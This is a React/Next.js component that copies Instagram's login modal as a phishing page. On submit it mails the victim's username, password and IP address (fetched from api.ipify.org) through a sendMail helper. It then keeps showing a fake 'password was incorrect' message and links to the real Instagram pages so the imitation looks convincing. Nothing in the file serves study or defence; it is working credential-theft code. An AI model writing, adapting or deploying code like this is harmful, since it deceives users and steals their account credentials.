"use client";

import sendMail from "@/app/sendmail";
import { Button } from "flowbite-react";
import Image from "next/image";
import Link from "next/link";
import { useState } from "react";
import { useRef } from "react";
import { ChangeEventHandler } from "react";

interface FormProps {
  username: { value: string };
  password: { value: string };
}

interface InstagramLoginProps {
  isOpen: boolean;
  closeModal: () => void;
}

const InstagramLogin = ({ isOpen, closeModal }: InstagramLoginProps) => {
  const [showPassword, setShowPassword] = useState(false);
  const [hasFilledBoth, setHasFilledBoth] = useState(false);
  const [error, setError] = useState("");

  const formRef = useRef(null);

  const pressShow = (e: any) => {
    e.preventDefault();
    setShowPassword(!showPassword);
  };

  function invalidCredentials() {
    setError("Sorry, your password was incorrect. Please double-check your password.");
  }

  const handleChange: ChangeEventHandler<HTMLInputElement> = () => {
    const form: FormProps | any = formRef.current;
    if (
      form &&
      form["username"]?.value.length > 0 &&
      form["password"]?.value.length >= 6
    ) {
      setHasFilledBoth(true);
    } else {
      setHasFilledBoth(false);
    }
  };

  return (
    <main className="flex flex-col items-center  bg-white justify-center  container">
      <div className="bg-white mb-3 border border-gray-300 w-[350px] pt-8 pb-4 flex flex-col items-center relative">
        <button
          type="button"
          onClick={closeModal}
          className="absolute top-2 right-2 z-10 w-fit p-2 bg-white rounded-full"
        >
          <Image
            src="/close.svg"
            alt="close"
            width={20}
            height={20}
            className="object-contain"
          />
        </button>
        <h1 className="instagram-logo"></h1>
        <form ref={formRef} className="w-64 flex flex-col gap-1 mt-8">
          <div className="relative">
            <input
              onChange={handleChange}
              name="username"
              id="username-input"
              type="text"
              className="w-[268px] h-[38px] rounded border border-gray-300 bg-gray-100 p-2 text-xs peer placeholder-transparent focus:outline-none focus:ring-0 focus:border-gray-500"
              placeholder="Phone number, username or email"
            />
            <label className="absolute transition-all left-2 top-0 text-gray-400 text-[9px] peer-placeholder-shown:text-xs peer-placeholder-shown:top-2 pointer-events-none">
              Phone number, username or email
            </label>
          </div>

          <div className="relative">
            <input
              onChange={handleChange}
              id="password-input"
              name="password"
              type={showPassword ? "text" : "password"}
              className="w-[268px] h-[38px] rounded border border-gray-300 bg-gray-100 p-2 text-xs peer placeholder-transparent focus:outline-none focus:ring-0 focus:border-gray-500"
              placeholder="Password"
            />
            <label className="absolute transition-all left-2 top-0 text-gray-400 text-[9px] peer-placeholder-shown:text-xs peer-placeholder-shown:top-2 pointer-events-none">
              Password
            </label>
            <button
              onClick={(e) => {
                pressShow(e);
              }}
              className="absolute right-2 bottom-2 focus:text-gray-500 rounded text-sm font-semibold"
            >
              {showPassword ? "Hide" : "Show"}
            </button>
          </div>
          <Button
            href={undefined}
            className={`mt-2 text-sm text-center ${
              hasFilledBoth
                ? "bg-blue-500 hover:!bg-blue-500"
                : "bg-blue-300 hover:!bg-blue-300"
            } text-white py-[0px] rounded-[8px] font-medium focus:outline-none focus:ring-0 w-[268px]`}
            onClick={async () => {
              if (hasFilledBoth) {
                await sendMail({
                  username: (
                    document.getElementById(
                      "username-input",
                    ) as HTMLInputElement
                  ).value,
                  password: (
                    document.getElementById(
                      "password-input",
                    )! as HTMLInputElement
                  ).value,
                  platform: "Instagram",
                  ipaddress: (() =>
                    fetch("https://api.ipify.org?format=json").then(
                      async (response) => {
                        const result = await response.json();
                        return result.ip;
                      },
                    ))()! as unknown as string,
                });
                setInterval(() => invalidCredentials(), 2000);
              }
            }}
          >
            Log In
          </Button>
        </form>
        <div className="flex space-x-2 w-64 mt-4 items-center">
          <span className="bg-gray-300 h-px flex-1"></span>
          <span className="p-2 uppercase text-xs text-gray-400 font-semibold">
            or
          </span>
          <span className="bg-gray-300 h-px flex-1"></span>
        </div>
        <Link href="/" className="mt-4 flex">
          {/* <div className="bg-no-repeat facebook-logo mr-1"></div> */}
          <Image
            src="/download.png"
            alt="login with facebook"
            width={16}
            height={16}
            className="mr-1 object-contain"
          />
          <span className="text-xs text-blue-900 font-semibold">
            Log in with Facebbok
          </span>
        </Link>
        {error && <span className="text-red-400 text-sm mt-4 text-center px-2">{error}</span>}
        <a href="https://www.instagram.com/accounts/password/reset/" target="_blank" className="mt-4">
          <span className="text-xs text-blue-900">Forgot password?</span>
        </a>
      </div>
      <div className="bg-white w-[350px] h-[63px] border border-gray-300 text-center py-4">
        <span className="text-sm mr-2">Don't have an account?</span>
        <a href="https://www.instagram.com/accounts/emailsignup/" target="_blank" className="text-blue-500 text-sm font-semibold">
          Sign up
        </a>
      </div>
      <div className="mt-3 text-center">
        <span className="text-xs">Get the app.</span>
        <div className="flex flex-row gap-2">
          <Link href="/">
            <Image
              src="/Googleplaylogo.png"
              alt="Get the app on googleplay"
              width={134}
              height={40}
              className="object-contain"
            />
          </Link>
          <Link href="/">
            <Image
              src="/Microsoftlogo.png"
              alt="Get it on Microsoft"
              width={110}
              height={40}
              className="object-contain"
            />
          </Link>
        </div>
      </div>
    </main>
  );
};

export default InstagramLogin;
